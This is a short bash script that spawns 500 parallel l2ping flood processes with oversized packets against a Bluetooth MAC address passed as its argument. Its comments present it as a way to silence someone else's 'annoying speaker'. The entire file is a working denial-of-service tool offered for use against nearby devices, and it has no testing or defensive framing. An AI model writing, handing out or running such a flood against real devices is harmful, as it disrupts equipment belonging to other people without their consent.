#!/bin/bash
# Use the annoying speaker's MAC address as the first argument of this bash script and run it.
# Enjoy the silence!

_counter=0

while (( 500 > $_counter ))
do
	_counter=$(($_counter+1))
	l2ping -i hci0 -s 640 -f $1 & 
	#l2ping -i hci1 -s 640 -f $1 &
	#l2ping -i hci2 -s 640 -f $1 & 
	#l2ping -i hci3 -s 640 -f $1 &
done
